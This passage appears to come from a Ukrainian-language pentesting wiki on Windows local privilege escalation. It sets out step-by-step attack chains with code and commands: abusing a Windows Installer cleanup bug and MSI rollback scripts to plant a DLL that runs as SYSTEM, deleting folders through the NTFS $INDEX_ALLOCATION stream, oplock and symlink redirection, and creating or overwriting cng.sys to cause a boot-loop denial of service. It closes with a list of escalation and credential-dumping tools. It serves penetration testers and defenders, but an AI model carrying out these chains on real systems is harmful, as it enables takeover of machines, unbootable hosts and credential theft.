Клієнт із низькими привілеями може звернутися до служби SYSTEM `msiexec.exe` через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зсувом `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зсувом `0xC8` і `CleanupTempPackages` зі зсувом `0x50`. Ці назви та зсуви отримано зворотним аналізом, і вони можуть відрізнятися між збірками.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` імперсоніфікує викликача лише під час відкриття переданого шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що викликач може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` планує шлях як папку незалежно від аргументу фільтра, переданого викликачем. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — шлях, контрольований викликачем, а дані `0x00000002` — прапорець папки. Потім `CleanupTempPackages(NULL, FALSE)` одразу запускає очищення. Його підвищений у правах робочий процес перелічує значення реєстру й передає записи папок до рекурсивної функції `FDeleteFolder` без перевірки походження шляху. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, очищує атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисним примітивом є повторне використання шляху, а не перенаправлення junction. Зареєструйте створений зловмисником `C:\Config.Msi`, видаліть його та дозвольте Windows Installer пізніше відтворити той самий шлях із захищеними даними відкату. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє новий каталог від імені SYSTEM. Це обходить передбачене обмеження `FILE_FLAG_OPEN_REPARSE_POINT` і механізм захисту від перенаправлення, оскільки точка повторної обробки не потрібна.<sup>[[41]](#references)</sup>

Цей примітив видалення підходить для наведеної нижче послідовності відкату: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, відтворіть його з NULL DACL і заздалегідь відкрийте handle з правом `WRITE_DAC`, перш ніж інсталятор посилить DACL. Попередньо відкритий handle дає змогу відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований файл `.rbs` можна замінити до продовження відкату.<sup>[[41]](#references)</sup>

Microsoft виправила цей шлях, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик і далі може повертати успіх, але шлях, контрольований зловмисником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не перевіряйте наявність виправлення за успішним поверненням методу.<sup>[[41]](#references)[[42]](#references)</sup>

Узагальнена техніка така:

1. **Етап 1 – Підготовка до перехоплення (залиште `C:\Config.Msi` порожнім)**

- Крок 1: Встановіть MSI
    - Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у папку, доступну для запису (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запустити **користувач без прав адміністратора**.
    - Після встановлення залиште відкритим **handle** до файлу.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для відкату).
    - **Опитуйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Власна синхронізація
    - `.msi` містить **власну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **очікує** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Коли надійде сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити файл `.rbf`, а оскільки він не зможе видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (зловмисник) видаляєте файл `.rbf` вручну.
    - Тепер **`C:\Config.Msi` порожній** і готовий до перехоплення.

> На цьому етапі **скористайтеся вразливістю довільного видалення папок на рівні SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 – Заміна сценаріїв відкату шкідливими**

- Крок 6: Відтворіть `C:\Config.Msi` зі слабкими ACL
    - Самостійно відтворіть папку `C:\Config.Msi`.
    - Встановіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, задавши:
        - `TARGETDIR`: місце, доступне для запису.
        - `ERROROUT`: змінну, яка спричинить примусову помилку.
    - Це встановлення буде використано, щоб знову запустити **відкат**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб стежити за `C:\Config.Msi` до появи нового `.rbs`.
    - Зафіксуйте його ім’я файлу.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **власну дію встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно застосовує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас і далі є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож ви все ще можете записувати до папки.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим сценарієм відкату**, який вказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване місце** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL із payload рівня SYSTEM**.

- Крок 12: Запустіть відкат
    - Надішліть сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Власну дію типу 19 (`ErrorOut`)** налаштовано так, щоб вона **навмисно завершувала встановлення помилкою** у визначеному місці.
    - Це запускає **відкат**.

- Крок 13: SYSTEM встановлює вашу DLL
    - Windows Installer:
        - Читає вашу шкідливу `.rbs`.
        - Копіює вашу DLL `.rbf` у цільове місце.
    - Тепер у вас є **шкідлива DLL у шляху, звідки її завантажує SYSTEM**.

- Останній крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений двійковий файл** (наприклад, `osk.exe`), який завантажує перехоплену вами DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка відкату MSI (описана вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо вразливість дає змогу лише **довільно видаляти файли**?

Можна використати **внутрішні механізми NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Отже, якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Навіть якщо ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **oplock призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **спрацьовує oplock** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це спрямовано на внутрішній потік NTFS, у якому зберігаються метадані папки, — його видалення видаляє папку.

5. Крок 5: Зняти oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видаляється від імені SYSTEM.

### Від створення довільної папки до постійної DoS-атаки

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows спробує завантажити `cng.sys` під час запуску.
- Виявивши папку, система **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Немає резервного варіанта** й **відновитися не вдасться** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів для логів/резервних копій і OM symlinks до довільного перезапису файлів / DoS під час завантаження

Коли **привілейована служба** записує логи/експорти за шляхом, прочитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис файлу (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна для запису зловмиснику (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, що записує за цим шляхом (лог, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб дізнатися привілейований шлях для логів, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор запустить «send test SMS»). Тепер запис потрапить у `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (hex/PE-парсером), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити драйвер із підміненого шляху → **DoS із циклом завантаження**. Це також застосовно до будь-якого захищеного файла, який привілейована служба відкриє для запису.

> Зазвичай `cng.sys` завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, її можуть спробувати завантажити першою, що робить цей шлях надійною ціллю для DoS із пошкодженими даними.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки через 20 секунд його буде завершено, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Детальніше про задіяні ключі реєстру та встановлення пакета _.msi_ — тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у вже запущеному процесі з High Integrity), ви зможете за допомогою привілею SeDebug **відкрити майже будь-який процес** (крім захищених), **скопіювати токен** цього процесу та створити **довільний процес із цим токеном**.\
Зазвичай ця техніка полягає у **виборі будь-якого процесу, запущеного від SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM не з усіма привілеями токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для підвищення привілеїв у `getsystem`. Вона полягає у **створенні pipe, а потім створенні/зловживанні службою для запису в цей pipe**. Тоді **сервер**, що створив pipe, використовуючи привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби), отримавши привілеї SYSTEM.\
Щоб [**дізнатися більше про іменовані pipe, прочитайте це**](#named-pipe-client-impersonation).\
Щоб переглянути приклад [**підвищення привілеїв із High Integrity до System за допомогою іменованих pipe, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, запущений від **SYSTEM**, ви зможете виконати довільний код із цими правами. Тому Dll Hijacking також корисний для такого типу підвищення привілеїв; до того ж його **набагато легше виконати з процесу з High Integrity**, оскільки він матиме **права на запис** у папки, що використовуються для завантаження dll.\
**Детальніше про Dll hijacking можна** [**дізнатися тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та конфіденційні файли (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє можливі неправильні конфігурації та збирає інформацію (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сеанси PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевіряє зібрані паролі в домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент підміни ADIDNS/LLMNR/mDNS і man-in-the-middle для PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для пошуку шляхів підвищення привілеїв**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей для підвищення привілеїв (ЗАСТАРІЛИЙ, замість нього використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей для підвищення привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост і шукає неправильні конфігурації (більше інструмент для збору інформації, ніж для підвищення привілеїв) (потрібно скомпілювати) **(**[**скомпільований файл**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe доступний на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє неправильні конфігурації (скомпільований виконуваний файл доступний на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі неправильні конфігурації (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але його можна використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт із правильною версією .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб дізнатися, яку версію .NET встановлено на хості жертви, можна виконати:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом експлуатації слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — воркшоп із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — у погоні за Silver Fox: гра в кішки-мишки в тінях kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість привілейованої файлової системи в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти тестування symbolic link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Посилання в минуле. Зловживання symbolic link у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: небезпечне розв'язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв'язання завдань зі списку перевірки C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: поєднання CLDFLT і race condition у ядрі DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одного I/O Ring достатньо: повноцінний примітив читання/запису в Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10 через 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: відстеження кроків назад до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — рекомендації щодо підвищення привілеїв через зміщення в спільній пам'яті Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
